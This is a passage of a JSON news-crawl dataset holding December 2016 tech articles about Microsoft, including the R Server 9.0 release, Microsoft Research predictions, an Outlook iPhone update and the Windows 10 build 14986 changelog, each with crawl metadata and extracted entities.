            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "vidcon",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "california",
            "sentiment": "none"
          },
          {
            "name": "new england",
            "sentiment": "none"
          },
          {
            "name": "los angeles",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T19:17:46.625+02:00"
    },
    {
      "thread": {
        "uuid": "b94e3b4854d9dee4a09cdec2a7fd1f79aceac461",
        "url": "http://omgili.com/ri/vkc1Z8ITDMvmd6quqxUWCa_fh9V.xC_cFuwK4GlenfrmGd66fTPYjIFWY_8ESP_H29tNZWl6emN.SMqLU1MgDE6dJSYk3nCi9Akp5FQ.2UjKcwC3iMp9YhE.Qv8koKmR",
        "site_full": "venturebeat.com",
        "site": "venturebeat.com",
        "site_section": "http://venturebeat.com",
        "site_categories": [
          "business"
        ],
        "section_title": "VentureBeat",
        "title": "Microsoft releases R Server 9.0 and free R Client 3.3.2",
        "title_full": "Microsoft releases R Server 9.0 and free R Client 3.3.2",
        "published": "2016-12-07T20:04:57.133+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 2406,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "b94e3b4854d9dee4a09cdec2a7fd1f79aceac461",
      "url": "http://omgili.com/ri/vkc1Z8ITDMvmd6quqxUWCa_fh9V.xC_cFuwK4GlenfrmGd66fTPYjIFWY_8ESP_H29tNZWl6emN.SMqLU1MgDE6dJSYk3nCi9Akp5FQ.2UjKcwC3iMp9YhE.Qv8koKmR",
      "ord_in_thread": 0,
      "author": "Jordan Novet",
      "published": "2016-12-07T20:04:57.133+02:00",
      "title": "Microsoft releases R Server 9.0 and free R Client 3.3.2",
      "text": "Microsoft today is announcing the release of R Server 9.0 , an update for the commercially supported big data software aimed at large organizations. Microsoft is also releasing R Client 3.3.2 , the latest version of the free software that people can run on desktop computers, as opposed to servers.\nR Server was previously known as Revolution R Enterprise but was renamed earlier this year, following Microsoft’s 2015 acquisition of Revolution Analytics , a vendor of distributions of the R programming language.\nThe new release — which draws on open-source R and community contributions as well as Microsoft’s own proprietary tools — contains a number of enhancements.\nFor one, the server software now includes the new MicrosoftML package with six new algorithms, including an artificial neural network for deep learning that can train on lots of data using graphics processing units (GPUs) and then make inferences on new data. (People can use one of many open source deep learning frameworks instead, but this is in R.)\nThere are also algorithms for more traditional forms of machine learning like random forest, boosted decision tree, and logistical regression, Microsoft partner director of program management Nagesh Pabbisetty wrote in a blog post .\nWith today’s release, models that data scientists write in R are easier to deploy into production. The server software lets data scientists expose models as application programming interfaces (APIs) and produce corresponding documentation using Swagger. R scripts and functions can be easily turned into web services as well.\nR Client version 3.3.2 by definition is memory-constrained but can be connected to R Server. It contains some features that aren’t available in the community version, while at the same time supporting community packages. Currently it’s only available for Windows . It can run as part of Microsoft’s Visual Studio integrated development environment (IDE) with the R Tools add-in .\nThe new release can be installed offline, and once it’s installed, it it checks for updates and tells users when they become available. The new MicrosoftML package is also included.\n",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "nagesh pabbisetty",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "revolution analytics",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T20:04:57.133+02:00"
    },
    {
      "thread": {
        "uuid": "831254ba8799e4b6c07ff30040f252bfcfc0bd3c",
        "url": "http://omgili.com/ri/.wHSUbtEfZR3OSYnYmcftMxzIJK0aAEzWk.vZji_kZH.AjZDJVlFxxuZ.EwfgmC8N0Z7Qiq1odwtET00uV0kcHeFRGne8CBD",
        "site_full": "www.rt.com",
        "site": "rt.com",
        "site_section": "http://feed.informer.com/digests/GO1LTKQOYZ/feeder.atom",
        "site_categories": [
          "news",
          "education"
        ],
        "section_title": "Russia News Review",
        "title": "Microsoft researchers say VR hallucinations & 'living software' to feature in next 10 years of tech",
        "title_full": "Microsoft researchers say VR hallucinations & 'living software' to feature in next 10 years of tech",
        "published": "2016-12-07T22:27:51.275+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://img.rt.com/files/2016.12/article/58485776c46188a74e8b46c9.jpg",
        "performance_score": 0,
        "domain_rank": 538,
        "social": {
          "facebook": {
            "likes": 87,
            "comments": 0,
            "shares": 87
          },
          "gplus": {
            "shares": 2
          },
          "pinterest": {
            "shares": 1
          },
          "linkedin": {
            "shares": 1
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "831254ba8799e4b6c07ff30040f252bfcfc0bd3c",
      "url": "http://omgili.com/ri/.wHSUbtEfZR3OSYnYmcftMxzIJK0aAEzWk.vZji_kZH.AjZDJVlFxxuZ.EwfgmC8N0Z7Qiq1odwtET00uV0kcHeFRGne8CBD",
      "ord_in_thread": 0,
      "author": "RT",
      "published": "2016-12-07T22:27:51.275+02:00",
      "title": "Microsoft researchers say VR hallucinations & 'living software' to feature in next 10 years of tech",
      "text": "Microsoft researchers say VR hallucinations & 'living software' to feature in next 10 years of tech Published time: 7 Dec, 2016 19:36 Get short URL © Mario Anzuoni / Reuters Non-discriminatory algorithms, programmable biology, and virtual reality (VR) systems that will offer hallucinations akin to LSD are what's in store over the next ten years, according to a group of Microsoft researchers. Tags Health , Information Technology \nVR technology is an emerging field poised for new breakthroughs in 2017, such as the ability to \"feature better body tracking\" and the \"ability to experience embodiment of virtual avatars from a first-person perspective,\" said Mar Gonzalez Franco, an MSR NExT researcher. \nAs for ten years from now, Franco said VR systems will offer \"rich multisensorial experiences\" capable of \"producing hallucinations\" that bend perceived reality. \n\"Using this technology, humans will retrain, recalibrate and improve their perceptual systems,\" she said. \"In contrast to current virtual reality systems that only stimulate visual and auditory senses, in the future the experience will expand to other sensory modalities including tactile with haptic devices.\" Microsoft researchers predict the 17 biggest technology advances for 2017 and beyond. Read more: https://t.co/xvC7eENqgj #Predictions17 pic.twitter.com/a8ViipqtZl — Microsoft Research (@MSFTResearch) December 5, 2016 \nGonzalez was one of 17 Microsoft researchers , all female in the company's effort to feature women's contributions to computing, that spoke of their respective fields to predict what they expect to see in 2017 as well as ten years from now, in 2027. \nJennifer Chayes, managing director of Microsoft Research labs in New England and New York, said current algorithms \"often reproduce the discrimination and unfairness in our data.\" In 10 years, advances in her field will result in the development of more fair and accountable algorithms that will be \"much more robust to manipulation.\" \nAsta Roseway, a principal research designer for Microsoft, said that in 2017, development of the Internet of Things (IoT) for agriculture will fuse \"ubiquitous sensing, computer vision capabilities and cloud storage to maximize machine learning and analytics\" in order to help farmers with micro- and macro-level farming practices in the face of instability. By 2027, such developments will include artificial intelligence that farmers will use to assess crop health and yields \"regardless of climate change, drought and disaster.\" Read more Virtual reality will help world’s first head transplant patient prepare for new body \nIn 10 years, expect automation to \"give rise to a new economy in which most people’s societal contribution comes from the data they generate as they go about their lives rather than the work they do,\" according to Nicole Immorlica, a senior researcher at Microsoft's New England research lab. \n\"Economists will be talking about ways to fairly compensate people for these contributions,\" she added. \"This will most probably involve heavier redistribution of wealth through mechanisms such as taxes or social programs.\" \nThe \"realization of programming biology,\" will emerge by 2027, according to Microsoft scientist Sara-Jane Dunn. \n\"While the last 50 years were utterly transformed by the ability to program on silicon, we will be entering the next programming revolution: The era of living software,\" she said.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "nicole immorlica",
            "sentiment": "none"
          },
          {
            "name": "gonzalez",
            "sentiment": "none"
          },
          {
            "name": "sara-jane dunn",
            "sentiment": "none"
          },
          {
            "name": "franco",
            "sentiment": "none"
          },
          {
            "name": "mario anzuoni",
            "sentiment": "none"
          },
          {
            "name": "asta roseway",
            "sentiment": "none"
          },
          {
            "name": "jennifer chayes",
            "sentiment": "none"
          },
          {
            "name": "mar gonzalez franco",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft research",
            "sentiment": "none"
          },
          {
            "name": "reuters",
            "sentiment": "none"
          },
          {
            "name": "information technology  vr",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "new york",
            "sentiment": "none"
          },
          {
            "name": "new england",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T22:27:51.275+02:00"
    },
    {
      "thread": {
        "uuid": "d90922a39e732deaadea4c33e843c197238f64c8",
        "url": "http://omgili.com/ri/.wHSUbtEfZRJcZIzEkwz53VfIySkCw1wJ618x2mooKmXL6myC.2GQw6vlFp7P07zHmAlkIOsg1S67ADgNr.GI6EkUevtf06DzPK7mjWVCRo-",
        "site_full": "mspoweruser.com",
        "site": "mspoweruser.com",
        "site_section": "https://mspoweruser.com",
        "site_categories": [
          "news",
          "tech"
        ],
        "section_title": "MSPoweruser",
        "title": "Outlook now lets you create recurring events on the iPhone",
        "title_full": "Outlook now lets you create recurring events on the iPhone",
        "published": "2016-12-07T23:56:35.643+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 14067,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "d90922a39e732deaadea4c33e843c197238f64c8",
      "url": "http://omgili.com/ri/.wHSUbtEfZRJcZIzEkwz53VfIySkCw1wJ618x2mooKmXL6myC.2GQw6vlFp7P07zHmAlkIOsg1S67ADgNr.GI6EkUevtf06DzPK7mjWVCRo-",
      "ord_in_thread": 0,
      "author": "Mehedi Hassan",
      "published": "2016-12-07T23:56:35.643+02:00",
      "title": "Outlook now lets you create recurring events on the iPhone",
      "text": "\nThe holiday season is only a few weeks away, and Microsoft is getting ready for 2017. There probably won’t be much news and updates coming out of Redmond until 2017, so the software giant is releasing updates to some of its apps to ensure customers are getting the best experience. Today, the company released a pretty major update to the Outlook app for iPhones, adding some interesting features.\niPhone owners can now create and edit recurring events on Outlook, which means it will be much easier to keep track events which you need to attend frequently. For example, if there’s an event which you need to attend every month, you can simply set-up a recurring event for it and Outlook will remind you about it every month.\nAlong with recurring events, Outlook on the iPhone is also getting support for Apple’s Passbook files which is definitely a much-needed addition if you use Passbook for your digital passes. With this feature, all the Passbook files which you receive via email on Outlook can now be viewed very easily.\nMicrosoft has also improved the Search feature to show results by conversation rather than separate emails. And lastly, Microsoft has also improved the way emails with small fonts are rendered in the app. If you are an Outlook user, you can get the latest update for your iPhone from the App Store here. ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "redmond",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "apple",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T23:56:35.643+02:00"
    },
    {
      "thread": {
        "uuid": "217a1f3d4c9e8e6e089e5ed60699faf299a87927",
        "url": "http://omgili.com/ri/_0JOtn.4SCqfzee87QYtUgvmfSGRdWM40h8PD4N8dsbg4S8N7fZCo7X.6EK5s5JzlKR7IxoXaJ6G0VJxqZJ8MtXHTXLigj1ETiyj2XpRHdrYhnNVyZPJzA--",
        "site_full": "blog.revolutionanalytics.com",
        "site": "revolutionanalytics.com",
        "site_section": "http://blog.revolutionanalytics.com/atom.xml",
        "site_categories": [
          "tech",
          "education"
        ],
        "section_title": "Revolutions",
        "title": "Microsoft R Server 9.0 now available",
        "title_full": "Microsoft R Server 9.0 now available",
        "published": "2016-12-08T01:25:14.138+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://revolution-computing.typepad.com/.a/6a010534b1db25970b01bb095cd731970d-600wi",
        "performance_score": 0,
        "domain_rank": 64742,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "217a1f3d4c9e8e6e089e5ed60699faf299a87927",
      "url": "http://omgili.com/ri/_0JOtn.4SCqfzee87QYtUgvmfSGRdWM40h8PD4N8dsbg4S8N7fZCo7X.6EK5s5JzlKR7IxoXaJ6G0VJxqZJ8MtXHTXLigj1ETiyj2XpRHdrYhnNVyZPJzA--",
      "ord_in_thread": 0,
      "author": "David Smith",
      "published": "2016-12-08T01:25:14.138+02:00",
      "title": "Microsoft R Server 9.0 now available",
      "text": "December 07, 2016 Microsoft R Server 9.0 now available \nMicrosoft R Server 9.0, Microsoft's R distribution with added big-data, in-database, and integration capabilities, was released today and is now available for download to MSDN subscribers . This latest release is built on Microsoft R Open 3.3.2 , and adds new machine-learning capabilities, new ways to integrate R into applications, and additional big-data support for Spark 2.0. \nThis release includes a brand new R package for machine learning: MicrosoftML . This package provides state-of-the-art, fast and scalable machine learning algorithms for common data science tasks including featurization, classification and regression. Some of the functions provided include: Fast linear and logistic model functions based on the Stochastic Dual Coordinate Ascent method; Fast Forests, a random forest and quantile regression forest implementation based on FastRank , an efficient implementation of the MART gradient boosting algorithm; A neural network algorithm with support for custom, multilayer network topologies and GPU acceleration; \nYou can learn more about MicrosoftML at this live webinar on Wednesday, December 14 . \nThe RevoScaleR package, which provides big-data support for Microsoft R Server, has been updated to support Spark 2.0 (This is in addition to existing support for in-database computations with SQL Server and Teradata.) New functions allow you to connect to a Hive, Parquet or Spark DataFrame data source, and execute data manipulation and predictive modeling tasks directly on the data as it resides within Spark. \nMicrosoft R Server also sports new capabilities to integrate R functions into other applications. (This is the results of enhancements to the former DeployR project, which is now part of Microsoft R Server.) Microsoft R Server can now host R functions exposed as web services: data scientists can publish R functions to the R Server, which can then be accessed from any application. Application developers can integrate those R functions into their applications using easy-to-consume Swagger-based APIs from any programming language. \nAlso released today is the free Microsoft R Client 3.3.2 . This is a desktop edition of Microsoft R Server 9.0, designed for local data science development and remote execution on local servers and in the cloud. It includes the same MicrosoftML package as Microsoft R Server. The RevoScaleR package in Microsoft R Client is limited in data size when computing locally, but can shift computations to a remote Microsoft R Server when working with larger data sets. It also includes the new mrsdeploy package , so you can remote-execute any R code on the remote R Server, or even publish R functions as a Web service. \nFor a complete list of changes, see What's New in R Server 9.0.1 . And for more on the release of Microsoft R Server 9.0, check out the blog post linked below.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "teradata",
            "sentiment": "none"
          },
          {
            "name": "gpu",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-08T01:25:14.138+02:00"
    },
    {
      "thread": {
        "uuid": "9a913334449cbe330146ab617623007e60964e82",
        "url": "http://omgili.com/ri/.wHSUbtEfZRJcZIzEkwz53VfIySkCw1wyrvWX1ysLdd8Xws7P63CqvRrsDC2d7Kp8ATk7VS5QrF6d_xqiSLPGdBiDPrd9Xiv8lI1KJnRNA2ZUdni9YzhEA--",
        "site_full": "mspoweruser.com",
        "site": "mspoweruser.com",
        "site_section": "https://mspoweruser.com",
        "site_categories": [
          "news",
          "tech"
        ],
        "section_title": "MSPoweruser",
        "title": "Here’s what’s new, fixed, and broken in Windows 10 Build 14986",
        "title_full": "Here’s what’s new, fixed, and broken in Windows 10 Build 14986",
        "published": "2016-12-08T02:17:59.204+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 14067,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "9a913334449cbe330146ab617623007e60964e82",
      "url": "http://omgili.com/ri/.wHSUbtEfZRJcZIzEkwz53VfIySkCw1wyrvWX1ysLdd8Xws7P63CqvRrsDC2d7Kp8ATk7VS5QrF6d_xqiSLPGdBiDPrd9Xiv8lI1KJnRNA2ZUdni9YzhEA--",
      "ord_in_thread": 0,
      "author": "Sean Chan",
      "published": "2016-12-08T02:17:59.204+02:00",
      "title": "Here’s what’s new, fixed, and broken in Windows 10 Build 14986",
      "text": "\nAnother week, another new build: this week, Microsoft is releasing build 14986 with a handful of improvements . One of the notable new additions in the build is major imrpovements to Cortana, Windows Ink, a new Windows Defender and more. Here’s the full changelog:\nWHAT’S NEW \nWhat’s new Making Cortana awesomer: Turn off your computer, change volume with voice commands: Being able to control your computer with just your voice is one of the top requests we get with Cortana, so we’re excited to say that we’ve added several new features to Cortana that let you do just that. Now you can shut down your PC just by asking Cortana. You can also restart, lock, or put the system to sleep, and raise and lower your system volume with just your voice. Give it a try and let us know what you think! Cortana loves music: You can now use Cortana to control music playback on more of your favorite music apps (EN-US only). Starting with this build, we’ve enabled natural language compatibility for iHeartRadio and TuneIn Radio . This will work on both, above the lock screen (PC is locked) as well as below! While you are listening to music in one of these apps, you can also use your voice to control playback and volume . With radio stations, we often want to know what that catchy tune is that has played a million times, so we added support for “What’s Playing” . Try saying “Hey Cortana, What song is Playing?” and it will work for all apps playing music. As a bonus, we made Cortana smarter by remembering the last played music app so you don’t have to say “on Groove” over and over. All you need to do is say your desired app one time, something like “Play jazz music on iHeartRadio”; then the next time, just say “Play rock music” and it will play on iHeartRadio. Please look for the Quest and give us feedback!\nAdding music recognition support to Chinese (Simplified): Cortana can now recognize music for customers in China. Simply tap the music notes icon in the top corner of Cortana’s home page, and Cortana will listen to whatever music is playing and use Netease to tell you what song it is. This works exactly like the feature does in English (United States). You can also say “Hey Cortana, what’s playing?” (except, in Chinese, of course, so you’d say ) and Cortana will start listening to the song. Full screen when Idle: We’ve made major improvements to Cortana’s look when using “Hey Cortana” when your PC is unlocked and idle. When your PC is in this state, asking Cortana questions will result in a gorgeous full-screen experience that is optimized for far field viewing! Give it a try by enabling “Hey Cortana” and then wait for about 10 seconds or so without touching your PC. May we recommend asking to see if it will snow tomorrow? Cortana sign-in using Azure Active Directory (AAD) identity: This capability will allow you to sign into Cortana with your work or school account instead your MSA, enabling you to use Cortana even if your organization does not support MSA. To sign in to Cortana using your work or school account, just go to Cortana’s Notebook and “About Me” and sign in. You’ll get the full Cortana experience with most of the same features . AAD join is currently only available on Windows 10 PCs. Enterprise Cloud Printing: The new Enterprise Cloud Printers discovery UI under Settings > Devices > Printers & scanners will enable corporate users to discover corporate printers when on Azure Active Directory joined devices when the IT admin deploys and configures the backend services\nThis feature requires the corresponding backend services to work, which are not yet available. Please continue to use existing UI to discover and install printers in the interim.\nWindows Game Bar improved full-screen support: With the Windows 10 Anniversary Update, we added support for six full screen games in Game Bar. For the Windows 10 Creators Update, we’re working on adding many more. In this build, we’ve added support for 19 additional games in full-screen mode with Windows game bar. As always, just hit WIN + G to invoke Game Bar to capture a recording or screenshot.\nARMA 3 Battlefield 1 Civilization V Dark Souls III Fallout 4 Final Fantasy XIV: A Realm Reborn Mad Max Mafia 2 NBA 2K16 Overwatch Star Wars: The Old Republic StarCraft II: Heart of the Swarm The Binding of Isaac The Witcher 3: Wild Hunt Terraria Tom Clancy’s The Division Total War: WARHAMMER Warframe World of Tanks Tip: You can control this feature through the Windows Game bar settings. In the settings dialog, look for the “Show Game bar when I play full-screen games” checkbox. See Major Nelson’s post on Game bar for more info on how to adjust settings for best game performance.\nTaking your Windows Ink experience to the next level: We’ve already announced and released some of the improvements that will be coming for our pen and Windows Ink users with the Creators Update, and with this build we’re excited to announce some more!\nResuming previous screen sketches: We’ve heard your feedback that it can be too easy to accidentally lose your Screen Sketch sketch, so we’re excited to announce that with build 14986 you can now resume previous sketches! By default, when you open Screen Sketch, it will always open to a new screenshot, but now you can click on the Resume button and it will take you back to the sketch you were working on when Screen Sketch last closed. Updated Ink Flyout Visuals: The Windows Ink pen, pencil and highlighter flyouts now show a preview of what it would look like to ink with the currently selected color and width. This improvement will be visible in any app that uses Windows Ink with the Windows 10 Creators Update SDK. We’ve also updated the flyouts so that they’ll no longer show what appear to be duplicate color entries when in high contrast, now support using the Esc key to close the flyout, and have returned the flyout to dismissing once you tap a color or change the width (rather than staying open until you manually close it) Finer control over ruler rotation: We’ve updated the Windows Ink ruler to now rotate in sub-degree increments when you’re moving it with touch, so as to make it easier to line the ruler up with two points on the screen Polishing your inking experience: The cursor will no longer be shown while you’re inking – we believe this makes the experience feel even more like pen on paper. Try it out and let us know what you think!\nNew Extensions in Microsoft Edge: Great news! We have new extensions to share with Windows 10 users. Please take a look at Ebates , Intel TrueKey , and Read & Write . Try them out and send feedback to the Feedback Hub or @MSEdgeDev on Twitter .\nUpdated Rendering Technology: We’ve changed the rendering technology used for many types of UWP app content, so please provide feedback through the Feedback Hub if you notice any new visual glitches in UWP apps. For additional context on this change, we are now widely using the same Windows.UI.Composition API that app developers have access to for XAML UWP app and shell rendering.\nNarrator improvements: Making our products more accessible is a goal of ours and improving the experience when using Narrator is a big part of that. As such, this flight comes with a number of improvements, including:\nNarrator has a new feature to give you additional information about fonts, colors, line spacing, margins and more . Press Caps Lock + F to hear this information. Continue to press Caps Lock + F to cycle through nine categories of information. Use Shift + Caps Lock + F to move through these categories in reverse. The default level for a Narrator feature called Context Awareness is now set to 2 . You will hear additional information as you move around areas such as the Start Menu, Office ribbon and more about the areas you are in. Use Alt + Caps Lock + / to cycle through the different options. Zero means off for the feature. The key to get advanced information about the item with focus has been changed to Caps Lock + 0 from Caps Lock + F in Narrator. We fixed an issue from recent flights where Narrator would only say “No item in view” when placing focus on the Start menu tiles. If you haven’t already read our plan for what to expect in 2017 with the Windows 10 Creators Update, and Office 365 – we invite you to go over it now. Lots of exciting things yet to come!\nNew Windows Defender dashboard: We are making it easier for you to view and control Windows 10 device security and health features available on your PC or tablet with the availability of a new dashboard coming in the Windows 10 Creators Update. Windows Insiders will get a preview of the new experience beginning today. After upgrading to this build, Insiders will have to restart their PC. After that, they can find the dashboard by searching for “Windows Defender” and clicking on the search result that says “Windows Defender/Trusted Windows Store app”. Remember, the dashboard is a work-in-progress and not fully functional just yet.\nRegistry Editor improvements: Continuing our theme of enhancing your registry experience , we’ve taken your feedback and added the familiar File Explorer keyboard navigation shortcuts to Registry Editor, so you can now easily go up (Alt+ Up arrow), backwards (Alt + Left arrow) or forwards (Alt + Right arrow) in the registry. We’ve also added a new entry point in the View menu so you can customize the font Registry Editor uses.\nThe USB Audio 2 Class Driver and You: Previous builds flighted to Windows Insiders have contained a Microsoft class driver for devices that support the USB Audio 2.0 standard. However, if you had a third-party driver which was specifically written for your device, Windows would use that instead . In order to get more miles on the class driver, we are temporarily changing things as of 14986 to prefer the class driver over third-party drivers – this is so we can flush out device compatibility issues and other bugs in our driver.\nWhen you have a chance, please go through all your regular listening scenarios and see how they sound (we’ll be adding a Quest about this too!). If everything works fine for you, awesome! If you do run into a problem where our class driver does not work with your device, please let us know by filing a problem report , and then manually switching to your specific third-party driver \nSome things that we are already aware of:\nOur class driver does not support ASIO Our class driver does not work in WASAPI exclusive mode in certain applications For the most recent information on USB Audio in Microsoft Windows, see https://aka.ms/usbaudio . \nImproved Update Experience : Windows strives to keep your device running the most secure, reliable and feature rich version of Windows available with minimum impact to you. We’ve heard your feedback, and as such, 14986 comes with two more improvements in this space:\nInvolving you more when specifying a time to update: For some of you though, receiving these updates has resulted in your device not being available for use when you needed it. For those of you that happened to fall into this category, you will be happy to see that we now have moved to involving you more in specifying when to successfully apply a pending update. If Windows Update in unable to find a good time to restart your machine to apply the latest updates, you will now get be prompted to “restart now”, “Schedule” a time that works for you, or simply “Remind me later” which will not apply the update but offer you these options again. Making it easier to free up space for upgrading: Sometimes PC disk drives fill up. When they do, you have to clear up space in order to install the latest update. Previously, this could be a bit of a hassle, but now we’ve simplified the process to help you through it and polished it up a bit along the way, so you can easily see how much space is needed, what your options are for creating it, and then make it happen. This updated Windows 10 setup page will be displayed in white (as shown below) when you encounter this issue while upgrading using Windows Update (there will be a link in Windows Update Settings to fix issues that will bring you here), and in blue when upgrading using an ISO (where there will be a link to fix issues before proceeding with the upgrade). Improving Windows 10 in Asia Along with Cortana’s new music recognition support for Chinese (Simplified) that we mentioned above, we’ve also done a few more things to improve the Windows 10 experience in Asia based on feedback.\nChinese Input Method Editor (IME) Improvements: We’ve heard your feedback about the Chinese typing experience, and we’ve happy to announce that we’ve made some changes based on what you’ve told us!\nSmart fuzzy matching for pinyin and updated Microsoft Pinyin IME candidate pane experience : As part of our effort to improve the efficiency of Chinese input, the Microsoft Pinyin IME candidate pane has been updated to make it easier to find the candidate you’re looking for. The IME now more clearly indicates fuzzy pinyin candidates, along with tips for how to change the related settings. When you’re typing, this feature will be triggered automatically when fuzzy pinyin candidates are detected and it will show them in the candidate window. We’ve also added a small icon to indicate when a particular cloud candidate is trending. In addition, since most of these trending candidates are related to hot stories, when you have that candidate highlighted, we’ve made it easier to search and learn more about it. New context menu for the IME mode : The IME mode indicator in the taskbar now has a context menu if you right-click it when using the Microsoft Pinyin or Wubi IME! It contains options to easily access that IME’s settings page, or show the language bar. Microsoft Pinyin IME now supports importing and exporting self-learned phrases: If you enable self-learning, the Microsoft Pinyin IME can learn and store the phrases as you use it to type. With this build, these phrases can be now be exported and imported. This means that if you re-install your PC, or have multiple PCs to maintain, you can now keep the same user lexicon. Wubi IME has been updated to support user-defined phrases: You can add custom phrases manually, or import and export custom phrase files. In the Wubi IME settings, click the “user-defined phrase” button to enter the custom phrase page. Line Mode for Chinese (Simplified) Handwriting: With the Anniversary Update, the Chinese (Simplified) handwriting panel only supported entering text using box mode – writing a single character in each box, and then the character would disappear after the candidate had been finalized, and there was no way to edit the ink. We’re excited to announce that with 14986 that is now longer the case! Just like the Japanese handwriting panel, the Chinese (Simplified) handwriting panel now supports line mode, so you can write and edit your characters all in one continuous sentence. We’ve also added two editing gestures for users – a strikethrough to delete, and a circle to grouping.\nJapanese Input Method Editor (IME) Improvements: \nIt’s now possible to remove text prediction candidates . To do this, hover over the entry in the candidate list and an ‘X’ button will appear. Removed candidates will not be suggested next time. Improving the Japanese IME conversion accuracy : Improving the conversion accuracy of Japanese IME is an ongoing goal of ours – with this build, we’ve enhanced our logic how we take into account previously determined context. To give an example, with the Anniversary Update, when typing “ ” in one shot and then converting the text, the IME would return the correct conversion. However, if you were to do the conversion in two parts (aka, type “ ”, convert, and then type “???” and convert), the IME would return a different and potentially undesirable conversion. With the work lighting up with 14986, the IME will now return the same result in both cases. We have also improved learning behavior when user registered shortcut word (???) is involved and added a new keyboard shortcut (Ctrl+.) so that you can flag particularly bad conversion errors. Conversions flagged in this way will be prioritized among all other mis-conversions when we investigate. We rely on your feedback to improve our conversion accuracy so please do report bad conversion errors when you see them! Improved reliability and responsiveness : We’ve improved the responsiveness of the Japanese Input Method Editor (IME) and fixed an issue where key input might sometimes get stuck in certain environments. We also fixed an issue where the Japanese IME’s self-learning wouldn’t work in certain environments, and fixed an issue resulting in being unable to use the IME to enter text in a program that had been launched using Command Prompt’s “runas” command. WHAT’S FIXED \nWhat’s fixed We have improved the Windows Hello face which may require you to “Improve Recognition” to get recognized again. To do this – go to Settings > Accounts > Sign-in Options and under “Windows Hello” and “Face Recognition”, select “Improve Recognition” to go through the Improve Recognition wizard. We updated the Taskbar’s context menu settings entry to now explicitly be called “Taskbar settings”, as that is where it pointed. We fixed an issue where the Virtual Touchpad’s left and right buttons might not work on some devices. We also fixed an issue where the Virtual Touchpad wouldn’t launch if the primary monitor was non-touch, and added the Virtual Touchpad icon to the Taskbar settings where you can Turn system icons on or off. We fixed the issue where apps such as Store, Photos, and People might launch on their own after your PC had been inactive for a period of time. We fixed the issue where navigating to Settings > System > Battery would crash the Settings app. We’ve changed the default state of the Handwriting Panel to be floating next to the text field, rather than docked at the bottom of the screen. If you prefer docked-mode, you can still select it by tapping the icon in the top right corner of the Handwriting Panel. We fixed an issue where using ~ to switch languages using the Thai keyboard when typing in Office apps, such as Outlook or Word 2016, might sometimes result in a hang. We’ve updated our migration logic, so that going forward from 14986 the default user’s numlock setting will now be preserved across upgrades. We fixed an issue where double-clicking on an Excel document to open it from File Explorer would crash Microsoft Excel. We fixed an issue where Windows Hello might get stuck “Looking for you”. We fixed an issue Insiders with Surface Dial may have experienced recently where rotating the Dial could result in unexpected beeps. We’re moving some things around in Storage Settings – stay tuned for future updates. For this flight, you’ll notice that the settings to change save locations has moved to its own page. We also fixed an issue where Storage Usage for the Other category might show an unexpectedly high number. We fixed an issue where the PowerShell entry in File Explorer’s File menu would sometimes be unexpectedly greyed out. We fixed an issue where the Clock and Calendar flyout in the taskbar wouldn’t launch when the display language was set to Chinese (Traditional) and the system was using the phonetic sorting method. 